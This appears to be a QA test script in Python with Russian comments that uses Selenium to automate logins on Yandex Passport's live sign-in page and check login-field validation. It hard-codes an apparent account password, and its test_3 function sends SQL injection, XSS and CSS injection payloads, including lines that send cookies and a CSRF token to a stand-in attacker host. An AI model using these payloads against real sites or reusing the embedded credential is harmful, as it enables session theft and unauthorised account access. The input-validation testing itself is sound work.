import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options # для запуска браузера в безголовом режиме
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.support import expected_conditions as EC


def quest(user_name=str('ererrewrq')):
    # Запуск тестов без отрисовки в браузере
    # chrome_options = Options()
    # chrome_options.add_argument("--headless")
    # driver = webdriver.Chrome(options=chrome_options)

    driver = webdriver.Chrome()
    driver.get('https://passport.yandex.ru/auth/add?from=cloud&origin=docs_web&retpath=https%3A%2F%2Fdocs.yandex.ru%2Fdocs%3Ftype%3Ddocx&backpath=https%3A%2F%2Fdocs.yandex.ru')

    # qwe = driver.find_element(By.XPATH, '//*[@id="passp-field-login"]')
    qwe = wait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="passp-field-login"]')))
    time.sleep(random.randrange(1, 5))
    qwe.send_keys(user_name)
    qwe.send_keys(Keys.ENTER)

    # qwe1 = driver.find_element(By.XPATH, '//*[@id="passp-field-passwd"]')
    qwe1 = wait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="passp-field-passwd"]')))
    time.sleep(random.randrange(1, 6))
    qwe1.send_keys('3bmvTOG9Be5r')
    qwe1.send_keys(Keys.ENTER)

    # # qwe2 = driver.find_element(By.XPATH, '//*[@id="app"]/div/div/div[1]/div[3]/div/div/a[1]')
    qwe2 = wait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="app"]/div/div/div[1]/div[3]/div/div/a[1]')))
    qwe2.click()
    time.sleep(1)
    # # driver.implicitly_wait(10)
    qwe3 = driver.find_element(By.XPATH, '//*[@id="app"]/div/div/div[1]/div[3]/div/div/div/ul/div[1]/div/span')
    # # qwe3 = wait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div/div/div[1]/div[3]/div/div/a[1]/span[1]')))
    assert qwe3.text == 'ererrewrq', "qwe qwe"
    # assert driver.current_url == 'https://docs.yandex.ru/docs?type=docx'


def wuest(input):

    driver = webdriver.Chrome()
    driver.get('https://passport.yandex.ru/auth/add?from=cloud&origin=docs_web&retpath=https%3A%2F%2Fdocs.yandex.ru%2Fdocs%3Ftype%3Ddocx&backpath=https%3A%2F%2Fdocs.yandex.ru')

    qwe = wait(driver, 3).until(EC.presence_of_element_located((By.XPATH, '//*[@id="passp-field-login"]')))
    time.sleep(random.randrange(1, 5))
    qwe.send_keys(input)
    qwe.send_keys(Keys.ENTER)

    qwe1 = wait(driver, 3).until(EC.presence_of_element_located((By.XPATH, '//*[@id="field:input-login:hint"]')))

    assert qwe1.text == 'Такой логин не подойдет'

def ruest(input):

    driver = webdriver.Chrome()
    driver.get('https://passport.yandex.ru/auth/add?from=cloud&origin=docs_web&retpath=https%3A%2F%2Fdocs.yandex.ru%2Fdocs%3Ftype%3Ddocx&backpath=https%3A%2F%2Fdocs.yandex.ru')

    qwe = wait(driver, 3).until(EC.presence_of_element_located((By.XPATH, '//*[@id="passp-field-login"]')))
    time.sleep(random.randrange(1, 5))
    qwe.send_keys(input)
    qwe.send_keys(Keys.ENTER)

    qwe1 = wait(driver, 3).until(EC.presence_of_element_located((By.XPATH, '//*[@id="field:input-login:hint"]')))

    assert qwe1.text == 'Логин не указан'


def best_1():

    try:
        quest('erer1rewrq ')
    except:
        print('test fall in use *erer1rewrq* password')
        pass
    quest(' ererrewrq')
    quest(' ererrewrq  ')

    print('Aвторизация зарегистрированного пользователя с пробелами в начале и концен логина - POSITIVE')


def test_2():

    quest('Ererrewrq')
    quest('ererREWrq')

    print('Aвторизация зарегистрированного пользователя с символами другого регистра в логине - POSITIVE')

def test_3():

    wuest('erer rewrq')   # символ пробела в логине
    wuest('&nbspererrewrq')
    wuest('erer_rewrq')
    wuest('erer!!!rewrq') #символы знаков препинания в логине
    wuest('123456789') #в логине только цифры
    wuest('qweqweqweqweqweqweqweqweqweqweq') # длина логина больше 30 символов
    wuest('erer&nbsprewrq') #символ неразрывного пробела - &nbsp в логине
    wuest('erеrrеwrq') #символы UTF в логине
    wuest('ывфывфывфыв') #символы UTF в логине
    wuest('žřšéíáý') #символы UTF в логине
    wuest('105 OR 1=1') #SQL injection
    wuest('" or ""="') #SQL injection
    wuest('105; DROP TABLE Suppliers') #SQL injection
    wuest("<script>alert('XSS atack!');</script>") #XSS injection
    wuest('<script>window.location="http://attacker/?cookie="+document.cookie</script>') #XSS injection
    wuest('<style>input[name=csrf_token][value=^a]{background-image:url(http://attacker.com/log?a);}</style>') #CSS injection
    wuest('<body>HTMLtag</body>') #HTML injection

    print('Aвторизация с вредоносными командами в поле логин - NEGATIVE')

def test_4():
    ruest('')
    ruest('  ')

    print('Aвторизация только с пробелами в поле логин - NEGATIVE')


test_4()